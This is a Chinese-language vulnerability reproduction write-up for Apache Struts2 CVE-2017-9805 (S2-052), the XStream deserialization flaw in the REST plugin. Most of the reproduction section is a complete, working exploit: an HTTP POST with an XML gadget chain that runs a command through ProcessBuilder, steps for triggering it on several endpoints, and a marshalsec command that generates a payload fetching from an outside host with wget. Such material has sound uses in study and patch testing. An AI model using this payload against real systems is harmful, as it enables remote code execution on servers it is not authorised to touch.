<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs2D2816FE{}
			.csC48167EA{padding:0pt 5.4pt 0pt 5.4pt;border-top:none;border-right:none;border-bottom:1pt windowtext solid;border-left:none}
			.csE0FE76B{text-align:left;text-indent:0pt;margin:2pt 0pt 2pt 0pt}
			.csE35A2CA7{padding:0pt 5.4pt 0pt 5.4pt;border-top:none;border-right:none;border-bottom:none;border-left:none}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2017-9805s2-052"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2017-9805</span><span class="csECDA2D3">）</span><span class="csDE05BCC">s2-052</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Struts2-Rest-Plugin</span><span class="cs9C1B1871">是让</span><span class="cs8926E06">Struts2</span><span class="cs9C1B1871">能够实现</span><span class="cs8926E06">Restful API</span><span class="cs9C1B1871">的一个插件，其根据</span><span class="cs8926E06">Content-Type</span><span class="cs9C1B1871">或</span><span class="cs8926E06">URI</span><span class="cs9C1B1871">扩展名来判断用户传入的数据包类型，有如下映射表：</span></p><table class="cs2D2816FE" border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse;">
			<tr>
				<td class="csC48167EA" valign="bottom"><p class="csE0FE76B"><span class="cs9C1B1871">扩展名</span></p></td><td class="csC48167EA" valign="bottom"><p class="csE0FE76B"><span class="cs8926E06">Content-Type</span></p></td><td class="csC48167EA" valign="bottom"><p class="csE0FE76B"><span class="cs9C1B1871">解析方法</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">xml</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">application/xml</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">xstream</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">json</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">application/json</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">jsonlib</span><span class="cs9C1B1871">或</span><span class="cs8926E06">jackson(</span><span class="cs9C1B1871">可选</span><span class="cs8926E06">)</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">xhtml</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">application/xhtml+xml</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">无</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">无</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">application/x-www-form-urlencoded</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">无</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">无</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">multipart/form-data</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">无</span></p></td></tr>
		</table>
		<p class="cs40DD2BC9"><span class="cs8926E06">jsonlib</span><span class="cs9C1B1871">无法引入任意对象，而</span><span class="cs8926E06">xstream</span><span class="cs9C1B1871">在默认情况下是可以引入任意对象的（针对</span><span class="cs8926E06">1.5.x</span><span class="cs9C1B1871">以前的版本），方法就是直接通过</span><span class="cs8926E06">xml</span><span class="cs9C1B1871">的</span><span class="cs8926E06">tag name</span><span class="cs9C1B1871">指定需要实例化的类名：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;classname&gt;&lt;/classname&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">或者</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;paramname class=&quot;classname&quot;&gt;&lt;/paramname&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在</span><span class="cs8926E06">Struts2</span><span class="cs9C1B1871">库中适用的</span><span class="cs8926E06">gedgetType</span><span class="cs9C1B1871">。</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">总得来说，用了</span><span class="cs8926E06">Struts2-Rest-Plugin</span><span class="cs9C1B1871">插件，这个插件是根据</span><span class="cs8926E06">Content-Type</span><span class="cs9C1B1871">或者扩展名来选择解析方法，</span><span class="cs8926E06">xstream</span><span class="cs9C1B1871">在默认情况下是可以引入任意对象的，所以他在处理</span><span class="cs8926E06">xml</span><span class="cs9C1B1871">的时候会发生</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">（</span><span class="cs8926E06">xstream</span><span class="cs9C1B1871">处理</span><span class="cs8926E06">xml</span><span class="cs9C1B1871">数据时，未对数据做任何过滤，在反序列化将</span><span class="cs8926E06">xml</span><span class="cs9C1B1871">数据转换成</span><span class="cs8926E06">object</span><span class="cs9C1B1871">时导致的</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">）。利用起来就是改</span><span class="cs8926E06">Content-Type</span><span class="cs9C1B1871">或扩展名</span><span class="cs8926E06"> .xml application/xml </span><span class="cs9C1B1871">发恶意</span><span class="cs8926E06">xml</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Struts 2.1.2 - Struts 2.3.33</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Struts 2.5 - Struts 2.5.12</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h2 class="cs868C439D">
			<a name="poc"><span class="csB2D98684">POC</span></a></h2>
		<p class="cs40DD2BC9"><span class="csE3F655E4">没回显</span><span class="cs5BEC2C28"> Response 500 </span><span class="csE3F655E4">但命令执行</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /orders/3 HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 10.17.14.18:8081</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 1655</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cache-Control: max-age=0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Origin: http://www.0-sec.org:8081</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/xml</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://10.17.14.18:8081/orders/3/edit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,und;q=0.7</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: JSESSIONID=249144A9BEB141072470A76C2A61D663</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;map&gt; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;entry&gt; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;string&gt;/tmp/vuln&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/entry&gt; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/map&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问</span><span class="cs8926E06">ip</span><span class="cs9C1B1871">：</span><span class="cs8926E06">port </span><span class="cs9C1B1871">直接到</span><span class="cs8926E06">/orders </span><span class="cs9C1B1871">你可以直接</span><span class="cs8926E06">change method </span><span class="cs9C1B1871">然后加上</span><span class="cs8926E06">body </span><span class="cs9C1B1871">改</span><span class="cs8926E06">Content-type </span><span class="cs9C1B1871">为</span><span class="cs8926E06">xml Response status code 500 </span><span class="cs9C1B1871">执行成功了（不要怀疑</span><span class="cs8926E06"> </span><span class="cs9C1B1871">我也怀疑</span><span class="cs8926E06"> </span><span class="cs9C1B1871">后来看了一下文件</span><span class="cs8926E06"> </span><span class="cs9C1B1871">是真的）</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">也可以编辑之后保存</span><span class="cs8926E06"> </span><span class="cs9C1B1871">会有一个</span><span class="cs8926E06">POST /orders/5 </span><span class="cs9C1B1871">或者其他数字</span><span class="cs8926E06"> </span><span class="cs9C1B1871">有</span><span class="cs8926E06">body</span><span class="cs9C1B1871">的</span><span class="cs8926E06"> </span><span class="cs9C1B1871">改掉</span><span class="cs8926E06">body </span><span class="cs9C1B1871">改</span><span class="cs8926E06">Content-type </span><span class="cs9C1B1871">为</span><span class="cs8926E06">xml </span><span class="cs9C1B1871">也可以执行</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">编辑完之后还会有一个</span><span class="cs8926E06">/orders.xhtml?statusCode=303 change method </span><span class="cs9C1B1871">删掉</span><span class="cs8926E06">body </span><span class="cs9C1B1871">改</span><span class="cs8926E06">Content-type </span><span class="cs9C1B1871">为</span><span class="cs8926E06">xml </span><span class="cs9C1B1871">文件名就不用改了</span><span class="cs8926E06"> </span><span class="cs9C1B1871">不然</span><span class="cs8926E06">404</span><span class="cs9C1B1871">了</span></p><p class="cs6FD73CFB"><span class="cs8926E06">payload</span><span class="cs9C1B1871">生成</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">下载</span><span class="cs8926E06"> https://github.com/ianxtianxt/marshalsec<br/>mvn clean package -DskipTests<br/>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO wget www.0-sec.org -O /tmp/1.html &gt;1.txt<br/></span><span class="cs9C1B1871">注：针对</span><span class="cs8926E06">XStream</span><span class="cs9C1B1871">支持很多种</span><span class="cs8926E06">Payload</span><span class="cs9C1B1871">，找一个</span><span class="cs8926E06">Struts2</span><span class="cs9C1B1871">也支持的即可</span><span class="cs8926E06">,</span><span class="cs9C1B1871">需要找到</span><span class="cs8926E06">Struts2</span><span class="cs9C1B1871">库中适用的</span><span class="cs8926E06">gedget</span><span class="cs9C1B1871">（事实上我找了，都试了，只有</span><span class="cs8926E06">ImageIO</span><span class="cs9C1B1871">好使，文章的都是骗人了，哭了）</span></p></body>
</html>
